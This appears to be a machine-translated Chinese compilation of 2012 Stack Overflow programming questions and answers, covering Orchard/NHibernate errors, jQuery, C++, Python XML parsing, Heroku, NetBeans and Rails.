   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
   at System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)
   at System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader()
   at NHibernate.AdoNet.AbstractBatcher.ExecuteReader(IDbCommand cmd)
   at NHibernate.Id.IdentityGenerator.InsertSelectDelegate.ExecuteAndExtract(IDbCommand insert, ISessionImplementor session)
   at NHibernate.Id.Insert.AbstractReturningDelegate.PerformInsert(SqlCommandInfo insertSQL, ISessionImplementor session, IBinder binder)
   --- End of inner exception stack trace ---
   at NHibernate.Id.Insert.AbstractReturningDelegate.PerformInsert(SqlCommandInfo insertSQL, ISessionImplementor session, IBinder binder)
   at NHibernate.Persister.Entity.AbstractEntityPersister.Insert(Object[] fields, Boolean[] notNull, SqlCommandInfo sql, Object obj, ISessionImplementor session)
   at NHibernate.Persister.Entity.AbstractEntityPersister.Insert(Object[] fields, Object obj, ISessionImplementor session)
   at NHibernate.Action.EntityIdentityInsertAction.Execute()
   at NHibernate.Engine.ActionQueue.Execute(IExecutable executable)
   at NHibernate.Event.Default.AbstractSaveEventListener.PerformSaveOrReplicate(Object entity, EntityKey key, IEntityPersister persister, Boolean useIdentityColumn, Object anything, IEventSource source, Boolean requiresImmediateIdAccess)
   at NHibernate.Event.Default.AbstractSaveEventListener.PerformSave(Object entity, Object id, IEntityPersister persister, Boolean useIdentityColumn, Object anything, IEventSource source, Boolean requiresImmediateIdAccess)
   at NHibernate.Event.Default.AbstractSaveEventListener.SaveWithGeneratedId(Object entity, String entityName, Object anything, IEventSource source, Boolean requiresImmediateIdAccess)
   at NHibernate.Event.Default.DefaultSaveOrUpdateEventListener.SaveWithGeneratedOrRequestedId(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveEventListener.SaveWithGeneratedOrRequestedId(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveOrUpdateEventListener.EntityIsTransient(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveEventListener.PerformSaveOrUpdate(SaveOrUpdateEvent event)
   at NHibernate.Event.Default.DefaultSaveOrUpdateEventListener.OnSaveOrUpdate(SaveOrUpdateEvent event)
   at NHibernate.Impl.SessionImpl.FireSave(SaveOrUpdateEvent event)
   at NHibernate.Impl.SessionImpl.Save(Object obj)
   at Orchard.Data.Repository`1.Create(T entity) in c:\Build\Orchard\src\Orchard\Data\Repository.cs:line 96
   at Orchard.Data.Repository`1.Orchard.Data.IRepository<T>.Create(T entity) in c:\Build\Orchard\src\Orchard\Data\Repository.cs:line 36
   at Orchard.Indexing.Services.IndexingTaskManager.CreateTask(ContentItem contentItem, Int32 action)
   at Orchard.Indexing.Services.IndexingTaskManager.CreateUpdateIndexTask(ContentItem contentItem)
   at Orchard.Indexing.Handlers.CreateIndexingTaskHandler.CreateIndexingTask(PublishContentContext context, ContentPart part)
   at Orchard.ContentManagement.Handlers.ContentHandler.InlineStorageFilter`1.Published(PublishContentContext context, TPart instance) in c:\Build\Orchard\src\Orchard\ContentManagement\Handlers\ContentHandler.cs:line 156
   at Orchard.ContentManagement.Handlers.StorageFilterBase`1.Orchard.ContentManagement.Handlers.IContentStorageFilter.Published(PublishContentContext context) in c:\Build\Orchard\src\Orchard\ContentManagement\Handlers\StorageFilterBase.cs:line 80
   at Orchard.ContentManagement.Handlers.ContentHandler.Orchard.ContentManagement.Handlers.IContentHandler.Published(PublishContentContext context) in c:\Build\Orchard\src\Orchard\ContentManagement\Handlers\ContentHandler.cs:line 274
   at Orchard.ContentManagement.DefaultContentManager.<>c__DisplayClass5c.<Create>b__59(IContentHandler handler) in c:\Build\Orchard\src\Orchard\ContentManagement\DefaultContentManager.cs:line 495
   at Orchard.InvokeExtensions.Invoke[TEvents](IEnumerable`1 events, Action`1 dispatch, ILogger logger) in c:\Build\Orchard\src\Orchard\InvokeExtensions.cs:line 17
2012-10-25 03:55:10,202 [13] NHibernate.AssertionFailure - An AssertionFailure occurred - this may indicate a bug in NHibernate or in your custom types.
NHibernate.AssertionFailure: null id in Orchard.Indexing.Models.IndexingTaskRecord entry (don't flush the Session after an exception occurs)
2012-10-25 03:55:10,202 [13] NHibernate.Impl.AbstractSessionImpl - DTC transaction prepre phase failed
NHibernate.AssertionFailure: null id in Orchard.Indexing.Models.IndexingTaskRecord entry (don't flush the Session after an exception occurs)
   at NHibernate.Event.Default.DefaultFlushEntityEventListener.CheckId(Object obj, IEntityPersister persister, Object id, EntityMode entityMode)
   at NHibernate.Event.Default.DefaultFlushEntityEventListener.GetValues(Object entity, EntityEntry entry, EntityMode entityMode, Boolean mightBeDirty, ISessionImplementor session)
   at NHibernate.Event.Default.DefaultFlushEntityEventListener.OnFlushEntity(FlushEntityEvent event)
   at NHibernate.Event.Default.AbstractFlushingEventListener.FlushEntities(FlushEvent event)
   at NHibernate.Event.Default.AbstractFlushingEventListener.FlushEverythingToExecutions(FlushEvent event)
   at NHibernate.Event.Default.DefaultFlushEventListener.OnFlush(FlushEvent event)
   at NHibernate.Impl.SessionImpl.Flush()
   at NHibernate.Transaction.AdoNetWithDistrubtedTransactionFactory.DistributedTransactionContext.System.Transactions.IEnlistmentNotification.Prepare(PreparingEnlistment preparingEnlistment)
2012-10-25 04:13:27,741 [8] NHibernate.AdoNet.AbstractBatcher - Could not execute query: INSERT INTO dbo_Orchard_Indexing_IndexingTaskRecord (Action, CreatedUtc, ContentItemRecord_id) VALUES (@p0, @p1, @p2); select SCOPE_IDENTITY()
System.Data.SqlClient.SqlException (0x80131904): Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
   at System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)
   at System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader()
   at NHibernate.AdoNet.AbstractBatcher.ExecuteReader(IDbCommand cmd)
2012-10-25 04:13:27,757 [8] NHibernate.Util.ADOExceptionReporter - Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
2012-10-25 04:13:27,772 [8] Orchard.ContentManagement.DefaultContentManager - GenericADOException thrown from IContentHandler by Orchard.Indexing.Handlers.CreateIndexingTaskHandler
NHibernate.Exceptions.GenericADOException: could not insert: [Orchard.Indexing.Models.IndexingTaskRecord][SQL: INSERT INTO dbo_Orchard_Indexing_IndexingTaskRecord (Action, CreatedUtc, ContentItemRecord_id) VALUES (?, ?, ?); select SCOPE_IDENTITY()] ---> System.Data.SqlClient.SqlException: Invalid object name 'dbo_Orchard_Indexing_IndexingTaskRecord'.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
   at System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, 
```

..........更多的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T04:49:38.713

好的，伙计们，我必须将 SQL 连接字符串更改为主数据库用户的用户凭据，而不是我创建的新帐户。似乎模块可以使用 CODE FIRST 来改变 Orchard 数据库的模式

# jquery - 显示 2 个对话框的 JQuery 对话框帮助

> ID：13061421
> 
> 赞同：0
> 
> 时间：2012-10-25T04:07:11.773
> 
> 标签：jquery

我有 2 个单独的有序列表，我想在一个对话框中显示它们，但由于某种原因，我得到了两个对话框。为什么是这样？

```
<ol>
 Test
 <li>a</li>
 <li>b</li>
</ol>

<ol>Test
 <li>a</li>
<li>b</li>
</ol> 
```

* * *

```
 $.ajax({
        url: 'test.asp',
        data: vals,
        dataType: 'json',
        type: 'post',
        success: function(data){
          var $dialog = $(data.message)
          .appendTo('body')
          .dialog({
             modal: true
          });
        }
      }); 
```

以上产生2个对话框。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:54:00.353

像这样将它们包装成一个`<div>`：

```
$.ajax({
    url: 'test.asp',
    data: vals,
    dataType: 'json',
    type: 'post',
    success: function(data){
        var $dialog = $("<div>").append(data.message)
        .appendTo('body')
        .dialog({
            modal: true
        });
    }
}); 
```

问题是由于您的响应中有两个有效的 HTML 字符串作为数组。当你调用 $(data.message) jQUery 创建两个单独`<ol>`的元素并将它们返回到一个数组中。然后，当您调用`.dialog()`该*数组*时，每个元素都会成为对话框中的顶部节点。

# c++ - 我需要创建一个用户定义类的数组，并且数组中的每个元素都有一个包含不同输入/输出的成员函数

> ID：13061425
> 
> 赞同：1
> 
> 时间：2012-10-25T04:07:29.097
> 
> 标签：c++

例如，

```
Class myMath (){ int doMath(int x, int y)}

main()
  {
     myMath math[5];

     math[0].doMath(10,20);     //this will add x and y
     math[1].doMath(3,1);       //this will subtract x and y
     etc...
  } 
```

如何才能做到这一点？我是c ++的初学者，所以请详细解释：P 谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:20:06.953

（此答案假定 C++ 的 C++11 标准。）

正如您在评论中指出的那样，我们可以假设存储在数组中的所有操作都将采用两个整数参数并返回一个整数。因此可以将它们表示为这种数据类型的函子：

```
std::function<int(int,int)> 
```

该数据类型的固定大小的 5 元素数组最好实现为

```
std::array<std::function<int(int,int)>,5> 
```

下面是一个使用这些数据类型的完整示例。它使用标准库（等）提供的函数对象实现*加*、*减*、*乘*、*除*四种基本操作。还有第五个算术运算，我使用整数幂的特殊实现。它被实现为 lambda 函数（C++11 提供的一种新的匿名函数类型。它也可以转换为数组并存储在数组中。`std::plus<int>``std::minus<int>``std::function<int(int,int)>`

```
#include <iostream>
#include <functional>
#include <array>

int main()
{
  /* Customized arithmetic operation. Calculates the arg2-th
     power of arg-1\. */
  auto power = [](int arg1, int arg2) {
    int result = 1;
    for (int i = 0 ; i < arg2 ; ++i)
      result *= arg1;
    return result;
  };

  /* Fixed-size array of length 4\. Each entry represents one
     arithmetic operation. */
  std::array<std::function<int(int,int)>,5> ops {{
      std::plus<int>(),
      std::minus<int>(),
      std::multiplies<int>(),
      std::divides<int>(),
      power
  }};

  /* 10 + 20: */
  std::cout << ops[0](10,20) << std::endl;
  /* 3 - 1: */
  std::cout << ops[1](3,1) << std::endl;
  /* 3rd power of 9: */
  std::cout << ops[4](9,3) << std::endl;

  return 0;
} 
```

# c++ - C++ Socket 断断续续

> ID：13061428
> 
> 赞同：-2
> 
> 时间：2012-10-25T04:07:53.350
> 
> 标签：c++, sockets, mfc, tcpclient, disconnect

我是套接字编程的新手，我们在网络上有一个正在运行的 MFC 客户端应用程序，由于某种原因，它的套接字每天至少断断续续地断开一次。这不是网络问题，因为其他网络应用程序运行良好。然而，我注意到日志中的一些内容，在套接字断开连接之前或多或少 10 分钟发生了数据库错误。就像是 ：

```
DB ERROR: ADO Error 1 (s)
select l.LABOID, l.LABOCODE, l.LABOCREDATE, l.LABOTEXT, l.SHORTTEXT,     l.LISACCOUNTINGMODE, l.ADDRESS1, l.ADDRESS2, l.POSTALCODE, l.CITY, l.STATE, l.COUNTRY, the  . TELEPHON, l.FAX, l.EMAIL, l.TELEPHON2, l.NATIONALCODE, l.FIRSTITEMID, l.ALTERNATECODE, l.LABOSERVICEID, l.STARTVALIDDATE, l.ENDVALIDDATE, l.LOGUSERID, l.LOGDATE, b.DICBINARYID , b.OBJECTLINK, b.OBJECTTYPE, b.DICBINARYTYPE, b.BINARYDATE, b.BINARYMIMETYPE, b.BINARYSIZE, b.LOGUSERID, b.LOGDATE, b.BINARYOBJECT, (select count (*) from d DICT_LABO_TO_DEVICE Where l.LABOID = d.LABOID) as NB_DEVICES from DICT_LABORATORIES l, b DICT_BINARY_DATA Where l.ENDVALIDDATE is null and l.LABOCODE like '%%' and l.LABOID b.OBJECTLINK = (+) and b.DICBINARYTYPE (+) = 1 and b . OBJECTTYPE (+) = 7 AND LABOID IN (1) order by l.LABOCODE

ORA-00936: missing expression of
Error: 0x80040e14 
```

在调试模式下，我发现线程仍在运行但未连接套接字。我无法确定是什么导致它断开连接。**是否建议重新连接？** 这是代码块：

```
if (m_pClientSocket->IsThreadStillRunning())
  {
    if(m_pClientSocket->m_boSocketConnected)
    {
      dwNbSent_L = *pdwBufferSize_P;        
      m_pClientSocket->Write(pbyBuffer_P, *pdwBufferSize_P);
      iotResult_L = IOTRANS_RESULT_SUCCESS;
    }
    else
    {
      m_pobjSession->Write(MSG_ERROR,TRACE_LOW
                          ,_T("%s Client socket is not connected")
                          ,(LPCTSTR)m_strLastErrFunc);
      iotResult_L = IOTRANS_RESULT_FAILED;
      SetError(ERROR_SOCKET_NOT_CONNECTED, _T("Client socket is not connected"), m_strLastErrFunc);
    }
  } 
```

谁能给我一个快速启动或检查项目列表以防止这种情况发生？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T09:11:24.053

这很可能**不是**网络错误。

Oracle DB 无法解析 SQL 语句（导致错误 ORA-00938），顶部的 ADO 层将 Oracle 错误转换为 ADO 错误 0x80040e14，这意味着'*命令包含一个或多个错误。*'。

预计这会在您的应用程序中产生错误。

你可以做的是：

*   检查（调试）您的应用程序，了解它如何创建其 SQL 语句。
*   检查您的数据库，是否应用了应用程序不知道的某些更改（删除的表/视图或重命名/删除的列）。

# xcode - 将 XCode 编译错误与部署目标 iOS 5.1 匹配

> ID：13061436
> 
> 赞同：2
> 
> 时间：2012-10-25T04:08:47.247
> 
> 标签：xcode, ios5, backwards-compatibility

将 XCode 更新到 4.5 后，它也更新到了 iOS SDK 6（我认为并删除了旧的 SDK）。我重新安装了旧的 5.1 模拟器（从“下载”首选项），但是有没有办法获得与部署目标（5.1）匹配的编译时错误？

现在，我可以编译对 iOS6 方法的调用，只是让它们在设备或模拟器上运行时失败。

有没有办法在编译时获取错误或警告？也许从代码完成中删除新方法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-02T18:22:55.527

Clang 不支持此类警告，因此无法在编译时生成它们。

但是，这并不意味着不可能，因为希望 Apple 将可用性宏添加到几乎每个公共 API 中。因此，第 3 方解析器能够确定方法是否可用。例如[AppCode](http://www.jetbrains.com/objc/)可以做到这一点。它会产生这样的警告：![在此处输入图像描述](../Images/e7eb1deb0239322f19652de674789c02.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-29T12:22:57.600

不，您有责任在运行时检查类、方法、常量和枚举的可用性，当您的部署目标可能没有它们时。

```
if ([MyClass class] == nil) { }

if (![MyClass instancesRespondToSelector:@selector(foo)]) { }

if (&kSomeConstant == NULL) { } 
```

此外，如果整个框架可能不存在，则可以选择链接到它（弱）。最后，使用您支持的每个操作系统版本在真实设备上进行测试。

[旧版本的 Xcode 可以并排安装](https://developer.apple.com/downloads/)，但如果您使用任何 iOS 6 框架、类、方法等，它们将无法构建您的项目。

# netbeans - 如何快速取消缩进代码块？

> ID：13061441
> 
> 赞同：11
> 
> 时间：2012-10-25T04:09:12.237
> 
> 标签：netbeans, ide, code-formatting

如何在 Netbeans 中与缩进代码块相反？

缩进多行代码，我可以选择并使用Tab键来实现。

我怎样才能快速完成相反的操作，而不是逐行进行？

更好的是，有没有办法格式化所有代码？我以前在 Dreamweaver 中使用过的某个地方..

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-10-25T04:17:26.887

要格式化 NetBeans 中的所有代码，请按`Alt`+ `Shift`+`F`

如果要缩进行，请选择行并按`Alt`+ `Shift`+`right arrow key`

要取消缩进，请按`Alt`+ `Shift`+`left arrow key`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-25T04:18:34.757

`shift`+`tab`如果没有选择当前行，则应该取消缩进，如果选择了多行，则应该取消缩进。

`ctrl`++`shift`将使`F7`NB 格式化突出显示的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-11T10:35:17.447

打开“工具”->“选项”->“键盘映射”，然后查找名为“重新缩进当前行或选择”的操作并设置您想要的任何快捷方式。

# c# - 在 Windows 8 上布局或分辨率发生变化时如何运行函数？

> ID：13061442
> 
> 赞同：2
> 
> 时间：2012-10-25T04:09:22.910
> 
> 标签：c#, windows-8, winrt-xaml

我使用大小与图形边界成比例的矩形创建了一个条形图。但是，当切换到不同的布局（例如快照视图）时，只有边框的大小会发生变化，而不是矩形的长度。如何检测布局或分辨率何时发生变化并调用函数来更新矩形的长度？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T07:26:05.187

在 Snapped/FullScreenPortrait/FullScreenLandscape 时，您可能应该只使用基本的 VisualStateManager 来更改布局。

如果您需要更高级的行为，请使用以下方法：
- 将 SizeChanged 处理程序添加到您的页面
- 在您的应用程序中将根 Grid/Panel 元素命名为 x:Name="Root" 并使其水平和垂直拉伸。
- 在 SizeChanged 事件处理程序中，您可以通过访问 Root.ActualWidth 和 Root.ActualHeight 找到实际的屏幕尺寸。在这里，您可以显示/隐藏/更改/调整您想要的任何内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:56:37.880

这是 MSDN 上关于这个确切主题的文章：http: [//msdn.microsoft.com/en-us/library/windows/apps/hh780612.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/hh780612.aspx)

还有一个微软似乎倾向于推荐的方法，那就是使用视觉状态来触发不同的视觉布局变化。

如果您执行 File->New Project 并选择 Grid App 应用程序，它们已经有代码（检查 App.cs）用于挂钩屏幕尺寸的变化并触发不同的视觉状态。

如果你有兴趣，我也写了一篇关于这个项目类型的剖析博文：http: [//markmacumber.net/2012/08/anatomy-of-the-grid-app-template-in-vs2012-for- windows-8-c-xaml.html](http://markmacumber.net/2012/08/anatomy-of-the-grid-app-template-in-vs2012-for-windows-8-c-xaml.html)

# python - 解析许多 xml 对象并使用 python 将它们写入文本文件（csv，tab-del，...）

> ID：13061443
> 
> 赞同：1
> 
> 时间：2012-10-25T04:09:44.150
> 
> 标签：python, xml, csv, beautifulsoup

我有许多以下格式的 XML 对象：

```
<GetSingleItemResponse xmlns="urn:ebay:apis:eBLBaseComponents">
  <Timestamp>2012-10-25T03:09:50.817Z</Timestamp>
  <Ack>Success</Ack>
  <Build>E795_CORE_BUNDLED_15430047_R1</Build>
  <Version>795</Version>
  <Item>
     <Description>...</Description>
     <ItemID>330810813385</ItemID>
     <EndTime>2012-10-25T04:32:37.000Z</EndTime>
     <Location>Paypal Prefered</Location>
     <GalleryURL>...</GalleryURL>
     <PictureURL>...</PictureURL>
     <PictureURL>...</PictureURL>
     <PrimaryCategoryID>177</PrimaryCategoryID>
     <PrimaryCategoryName>
     Computers/Tablets & Networking:Laptops & Netbooks:PC Laptops & Netbooks
     </PrimaryCategoryName>
     <BidCount>2</BidCount>
     <ConvertedCurrentPrice currencyID="USD">294.99</ConvertedCurrentPrice>
     <ListingStatus>Active</ListingStatus>
     <TimeLeft>PT1H22M47S</TimeLeft>
     <Title>
     HP Compaq ZD8000 3800Mhz Full Loaded Ready to go, nice unit & super fast Laptop
     </Title>
     <ShippingCostSummary>
     <ShippingServiceCost currencyID="USD">23.99</ShippingServiceCost>
     <ShippingType>Flat</ShippingType>
     <ListedShippingServiceCost currencyID="USD">23.99</ListedShippingServiceCost>
     </ShippingCostSummary>
     <ItemSpecifics>
        <NameValueList>
           <Name>Operating System</Name>
           <Value>Windows XP Professional</Value>
        </NameValueList>
        <NameValueList>
           <Name>Screen Size</Name>
           <Value>17.0</Value>
        </NameValueList>
        <NameValueList>
           <Name>Processor Type</Name>
           <Value>Intel Pentium 4 HT</Value>
        </NameValueList>
     </ItemSpecifics>
     <Country>US</Country>
     <AutoPay>false</AutoPay>
     <ConditionID>2500</ConditionID>
     <ConditionDisplayName>Seller refurbished</ConditionDisplayName>
   </Item>
</GetSingleItemResponse> 
```

对于每个 xml 对象，我想获取所有项目标签标签，例如 itemid、endtime 等。以及所有项目特定标签标签，例如操作系统、屏幕大小等。我想保存this 将每个 xml 对象放入内存中，转换成适当的数据结构（对象）。最后，我想将所有 xml 对象的所有信息写入 csv 文件。

困难在于先验我不知道 csv 文件的列（标题）是什么。对于第一个 xml 对象，我将创建与项目和项目细节组合所具有的子标签数量一样多的列。

然后，随着新项目出现新列，我将添加越来越多的列，为以前未出现的列添加 NA。

我正在寻找有关如何处理 xml 对象、转换（保存）xml 对象的数据结构以及如何将所有最终处理的 xml 数据写入 csv 文件的建议。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:50:08.700

对于 csv 中的每一行，您应该创建一个字典。在解析 xml 时，您应该`<Item>`从代码片段中为每个字典填充此字典。当你这样做时，你应该保留一组键，即列……这样在文件的末尾你就会知道你有多少列和它们的标题。

这是如何做到这一点的一小段（如果数据适合内存），我将使用 BeautifulSoup ，因为您在标签中提到它并且它很棒：

```
import sys
import csv

from BeautifulSoup import BeautifulSoup as Soup

doc = Soup(xml_string)
data = []
cols = set()
for item in doc.findAll('item'):
    d = {}
    for sub in item:
        if hasattr(sub, 'name'):
            d[sub.name] = sub.text
    data.append(d)
    cols = cols.union(d.keys())

cw = csv.writer(sys.stdout)
cw.writerow(cols)
for row in data:
    cw.writerow([row.get(k, 'N/A') for k in cols]) 
```

请注意，此解决方案假定您的密钥是唯一的，但在您的示例中，该项目有两个图片 url，如果您希望两者都显示它是可能的（因为没有什么是不可能的）只是稍微复杂一点。

如果数据不适合内存，则需要执行两遍，第一遍收集键，第二遍打印 csv ......注意，在这种情况下，您应该用另一个解析器（如[sax](http://docs.python.org/library/xml.sax.html) ）替换 BeautifulSoup，因为数据不适合内存

# django - 使用 Gunicorn 将图像上传到 Django 管理员时 Heroku 上的错误 H13

> ID：13061444
> 
> 赞同：3
> 
> 时间：2012-10-25T04:09:45.960
> 
> 标签：django, heroku

我正在使用 Django 管理界面上传图像。它以前运行良好，但现在在上传仅约 1 MB 的图像时出现应用程序错误 (H13)。

Heroku 日志：

```
2012-10-25T04:00:06+00:00 app[web.1]: 2012-10-25 04:00:06 [2] [CRITICAL] WORKER TIMEOUT (pid:13)
2012-10-25T04:00:06+00:00 app[web.1]: 2012-10-25 04:00:06 [2] [CRITICAL] WORKER TIMEOUT (pid:13)
2012-10-25T04:00:06+00:00 heroku[router]: Error H13 (Connection closed without response) -> POST www.website.com/admin/whatever/ dyno=web.1 queue= wait= service= status=503 bytes=
2012-10-25T04:00:06+00:00 app[web.1]: 2012-10-25 04:00:06 [68] [INFO] Booting worker with pid: 68 
```

档案：

```
web: gunicorn myapplication.wsgi -b 0.0.0.0:$PORT -w 10 
```

设置：

```
STATICFILES_STORAGE = DEFAULT_FILE_STORAGE = 'storages.backends.s3boto.S3BotoStorage' 
```

知道发生了什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T16:21:44.983

如果到那时无法完成请求，Heroku 网络工作者将在 30 秒后超时。如果您的上传速度现在真的很慢并且无法在 30 秒内完成响应，您可能会收到此错误。如果不是您的上传速度，则可能是 Heroku 和 S3 之间的上传速度，因为您的上传似乎是定向到那里的。

# jquery - Deferred.state 更改 css 属性

> ID：13061445
> 
> 赞同：0
> 
> 时间：2012-10-25T04:09:47.547
> 
> 标签：jquery, jquery-deferred

正确的，

我在这里有这段代码：

```
var dfd1 = $.Deferred();
    var dfd2 = $.Deferred();

    $( "#draggable" ).draggable({
        revert: "invalid",
        snap: "#droppable",
        });
    $( "#droppable" ).droppable({
        accept: "#draggable",
        drop: function() {
            $("#whistle").get(0).play();
            dfd1.resolve();
            }
        });
    $( "#draggable2" ).draggable({
        revert: "invalid",
        snap: "#droppable",
        });
    $( "#droppable2" ).droppable({
        accept: "#draggable2",
        drop: function() {
            $("#whistle").get(0).play();
            dfd2.resolve();
            }
        });
    var done = $.when(dfd1.promise(), dfd2.promise())
        done.then(function(){
        $("#whistle2").get(0).play();
        alert ("done!")
        }); 
```

我一直在尝试添加这样的东西：

```
if(done.state("#sec_a_div") == "resolved"){
        $("#sec_a_th").css("background-color"="green")
    }
    else {
        $("#sec_a_th").css("background-color"="yellow")
    } 
```

问题是，有几个 sec id'd div。我想知道，也许有人可以向我解释，如何使这些 dfd 对这个 div 是唯一的，也许然后如何根据状态改变缩略图的颜色。我希望我尽可能清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T11:37:34.287

好的，我搞定了，如果有人感兴趣的话。

```
var done = $.when(dfd1.promise(), dfd2.promise())
    done.then(function(){
    $("#whistle2").get(0).play();
    alert ("done!");
    $("#sec_a_th").css({'background-color' : 'green', 'opacity' : 0.4});
    });
$("#sec_a_th").mousedown(function(){
    $("#sec_a_th").css({'background-color' : 'yellow', 'opacity' : 0.4});
    }); 
```

# javascript - 添加 JQuery 时出错

> ID：13061446
> 
> 赞同：3
> 
> 时间：2012-10-25T04:10:02.610
> 
> 标签：javascript, jquery

我将 JQuery 添加到我的 HTML 文件中：

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script> 
```

然后我添加一个指向我的 JavaScript 文件的链接：

```
<script src="public/javascripts/new_javascript.js" type="text/javascript"></script> 
```

（我检查了这个链接是否有效。）

在我做的文件中

```
$(document).ready(function() {
   alert("hey!");
}); 
```

但是谷歌浏览器开发者工具显示错误：

```
Uncaught TypeError: Object #<HTMLDocument> has no method 'ready' 
```

怎么可能是错误？

我在 Rails 中这样做，HTML 就像：

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>   
<script src="public/javascripts/prototype.js?1349898477" type="text/javascript"></script> 
<script src="public/javascripts/effects.js?1349898477" type="text/javascript"></script> 
<script src="public/javascripts/dragdrop.js?1349898477" type="text/javascript"></script> 
<script src="public/javascripts/controls.js?1349898477" type="text/javascript"></script> 
<script src="public/javascripts/rails.js?1349898477" type="text/javascript"></script> 
<script src="public/javascripts/application.js?1349898477" type="text/javascript"></script> 
<script src="public/javascripts/new_javascript.js?1351137775" type="text/javascript"></script> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T04:18:07.413

jQuery 和 Prototype 相互冲突。尝试使用 jQuery 而不是 $ 用于 jquery 命令：

```
jQuery(document).ready(function() {
   alert("hey!");
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:20:17.223

如果原型*仍然*像黑暗时代一样覆盖 $，请将您的 JQ 代码包装在一个函数中，如下所示：

```
(function($) {

    // Do whatever you like with $

    $(function() {
        alert("Document ready");
    })

})(jQuery); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T04:22:13.843

您可以使用[jQuery.noConflict()](http://api.jquery.com/jQuery.noConflict/)

```
$.noConflict();
jQuery(document).ready(function($) {
    // Code that uses jQuery's $ can follow here.
});
// Code that uses other library's $ can follow here. 
```

# ruby-on-rails - 从另一个哈希创建一个哈希

> ID：13061447
> 
> 赞同：4
> 
> 时间：2012-10-25T04:10:09.433
> 
> 标签：ruby-on-rails, ruby

我目前正在使用两个包含公共值的不同哈希，我想规范化哈希键名。

哈希 #1 看起来像：

```
files = [{ "filename" => "file.txt","path" => "/folder/file.txt" }] 
```

虽然哈希 #2 看起来像：

```
